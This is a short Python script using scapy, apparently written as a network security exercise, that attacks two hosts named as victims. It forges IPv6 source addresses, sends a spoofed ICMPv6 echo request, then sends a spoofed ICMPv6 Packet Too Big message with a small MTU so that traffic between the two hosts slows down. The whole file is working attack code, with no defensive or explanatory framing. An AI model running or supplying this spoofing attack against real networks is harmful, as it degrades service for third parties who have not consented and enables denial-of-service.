#!/usr/bin/python

# Jack Cardwell
# February 18, 2018

# This program attempts to send out packet too big messages with a really small MTU in order to slow
# down traffic

# LIBRARY IMPORTS
from scapy.all import *
from sys import *

def tooBig():

    # make sure that the user passed in enough arguments
    if len(sys.argv) < 3:
        print("Error: Please enter two command line options.")
        print("Usage: ./icmpv6TooBig.py [Victim 1] [Victim 2]")
        exit(2)

    victim1 = sys.argv[1]
    victim2 = sys.argv[2]

    # send out an echo request to victim 2 from victim 1
    ip = IPv6(src = victim2, dst = victim1)
    req = ICMPv6EchoRequest()

    # send the packet
    send(ip/req)

    # next send a packet from victim 1 to victim with a really small MTU
    ip2 = IPv6(src = victim1, dst = victim2)
    tooBig = ICMPv6PacketTooBig(mtu=800)

    send(ip2/tooBig)

    exit(1)

tooBig()
